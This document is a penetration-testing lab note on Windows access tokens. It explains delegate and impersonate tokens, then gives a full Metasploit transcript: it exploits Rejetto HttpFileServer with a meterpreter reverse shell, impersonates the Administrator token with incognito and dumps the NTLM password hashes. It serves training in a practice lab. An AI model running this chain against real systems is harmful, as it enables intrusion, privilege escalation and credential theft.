Windows Access Tokens

- Windows access tokens are a core element of the authentication process on Windows and are created and managed by the local security authority subsystem service (LSASS).
- A windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
- Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.
- An access token will typically be assigned one of the following security levels:
	- Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
	- Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP.
- Impersonate level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
- Delegate level tokens pose the largest threat as they can be used to impersonate tokens on any system.
- The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonating or delegation tokens available.
- The following are the privileges that are required for a successful impersonation attack:
	- SeAssignPrimaryToken: This allows a user to impersonate tokens.
	- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
	- SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
- Incognito is a built in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.
- We can use the incognito module to display list of available tokens that we can impersonate.


```
root@attackdefense:~# cat /root/Desktop/target 
Target IP Address : 10.5.25.175
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 13 database server: main.
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.1.0-dev                           ]
+ -- --=[ 2160 exploits - 1146 auxiliary - 367 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt

msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 > setg rhosts 10.5.25.175
rhosts => 10.5.25.175
msf6 > db_nmap -sV -O 10.5.25.175
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2023-08-06 23:12 IST
[*] Nmap: Nmap scan report for 10.5.25.175
[*] Nmap: Host is up (0.0018s latency).
[*] Nmap: Not shown: 995 closed ports
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 80/tcp   open  http          HttpFileServer httpd 2.3
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.91%E=4%D=8/6%OT=80%CT=1%CU=39726%PV=Y%DS=3%DC=I%G=Y%TM=64CFDB86
[*] Nmap: OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U
[*] Nmap: OS:)OPS(O1=M546NW8NNS%O2=M546NW8NNS%O3=M546NW8%O4=M546NW8NNS%O5=M546NW8NNS%
[*] Nmap: OS:O6=M546NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%D
[*] Nmap: OS:F=Y%T=7F%W=FFFF%O=M546NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=7F%S=O%A=S+%F=AS%RD=0
[*] Nmap: OS:%Q=)T2(R=Y%DF=Y%T=7F%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=7F%W=0%S=
[*] Nmap: OS:Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y
[*] Nmap: OS:%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R
[*] Nmap: OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
[*] Nmap: OS:7F%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=7F%CD=Z
[*] Nmap: OS:)
[*] Nmap: Network Distance: 3 hops
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 18.97 seconds
msf6 > search type:exploit name:rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.5.25.175      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.26.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.26.3:4444 
[*] Using URL: http://0.0.0.0:8080/CwKRPSBG5GuJuD
[*] Local IP: http://10.10.26.3:8080/CwKRPSBG5GuJuD
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /CwKRPSBG5GuJuD
[*] Sending stage (200262 bytes) to 10.5.25.175
[!] Tried to delete %TEMP%\uoRYyhpAyok.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.26.3:4444 -> 10.5.25.175:49737) at 2023-08-06 23:13:23 +0530
[*] Server stopped.

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege

meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > incognito -h
[-] Unknown command: incognito
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                         Path
 ---   ----  ----                     ----  -------  ----                         ----
 0     0     [System Process]
 4     0     System                   x64   0
 68    768   svchost.exe              x64   0
 88    4     Registry                 x64   0
 392   4     smss.exe                 x64   0
 528   768   svchost.exe              x64   0
 556   544   csrss.exe
 580   768   svchost.exe              x64   0
 632   544   wininit.exe              x64   0
 640   624   csrss.exe
 696   624   winlogon.exe             x64   1
 768   632   services.exe             x64   0
 776   632   lsass.exe                x64   0
 788   976   WmiPrvSE.exe
 800   696   dwm.exe
 804   4336  conhost.exe
 840   768   amazon-ssm-agent.exe     x64   0
 888   768   svchost.exe              x64   0
 912   632   fontdrvhost.exe
 920   696   fontdrvhost.exe
 976   768   svchost.exe              x64   0
 992   768   svchost.exe              x64   0
 1036  768   svchost.exe              x64   0
 1084  3748  wscript.exe
 1100  768   svchost.exe              x64   0
 1132  768   svchost.exe              x64   0
 1184  768   svchost.exe              x64   0
 1216  768   svchost.exe              x64   0
 1252  976   WmiPrvSE.exe
 1268  768   svchost.exe              x64   0
 1320  768   svchost.exe              x64   0
 1392  768   svchost.exe              x64   0
 1400  768   svchost.exe              x64   0
 1412  1348  SIHClient.exe            x64   0
 1464  768   svchost.exe              x64   0
 1540  768   svchost.exe              x64   0
 1596  768   svchost.exe              x64   0
 1620  768   svchost.exe              x64   0
 1632  768   svchost.exe              x64   0
 1696  768   svchost.exe              x64   0
 1764  768   svchost.exe              x64   0
 1828  768   svchost.exe              x64   0
 1844  768   svchost.exe              x64   0
 1864  768   svchost.exe              x64   0
 1916  768   svchost.exe              x64   0
 1988  768   svchost.exe              x64   0
 2072  768   svchost.exe              x64   0
 2088  768   svchost.exe              x64   0
 2140  768   svchost.exe              x64   0
 2204  768   svchost.exe              x64   0
 2252  768   svchost.exe              x64   0
 2332  768   svchost.exe              x64   0
 2396  768   svchost.exe              x64   0
 2432  2648  WMIADAP.exe
 2464  768   svchost.exe              x64   0
 2472  768   svchost.exe              x64   0
 2508  1084  rvPmyrnmGdYwN.exe              1
 2620  768   spoolsv.exe              x64   0
 2640  768   svchost.exe              x64   0
 2648  768   svchost.exe              x64   0
 2676  768   LiteAgent.exe            x64   0
 2712  768   svchost.exe              x64   0
 2736  768   svchost.exe              x64   0
 2764  768   svchost.exe              x64   0
 2796  768   svchost.exe              x64   0
 2804  768   svchost.exe              x64   0
 2816  768   svchost.exe              x64   0
 2844  768   svchost.exe              x64   0
 2892  768   svchost.exe              x64   0
 3252  4092  ctfmon.exe               x64   1        ATTACKDEFENSE\Administrator  C:\Windows\System32\ctfmon.exe
 3344  768   svchost.exe              x64   0
 3500  768   svchost.exe              x64   0
 3640  3620  explorer.exe             x64   1        ATTACKDEFENSE\Administrator  C:\Windows\explorer.exe
 3748  3920  hfs.exe
 3752  768   svchost.exe              x64   0
 3804  1916  sihost.exe               x64   1        ATTACKDEFENSE\Administrator  C:\Windows\System32\sihost.exe
 3816  768   svchost.exe              x64   1        ATTACKDEFENSE\Administrator  C:\Windows\System32\svchost.exe
 3840  768   svchost.exe              x64   1        ATTACKDEFENSE\Administrator  C:\Windows\System32\svchost.exe
 3868  768   svchost.exe              x64   0
 3876  1464  taskhostw.exe            x64   1        ATTACKDEFENSE\Administrator  C:\Windows\System32\taskhostw.exe
 3972  768   svchost.exe              x64   0
 4048  768   svchost.exe              x64   0
 4092  768   svchost.exe              x64   0
 4176  1464  CompatTelRunner.exe
 4240  976   ShellExperienceHost.exe  x64   1        ATTACKDEFENSE\Administrator  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 4336  2508  cmd.exe
 4348  976   SearchUI.exe             x64   1        ATTACKDEFENSE\Administrator  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 4424  976   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator  C:\Windows\System32\RuntimeBroker.exe
 4436  4176  conhost.exe
 4544  976   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator  C:\Windows\System32\RuntimeBroker.exe
 4836  976   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator  C:\Windows\System32\RuntimeBroker.exe
 4900  768   vds.exe                  x64   0
 4956  768   msdtc.exe                x64   0

meterpreter > migrate 3640
[*] Migrating from 2508 to 3640...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter >
```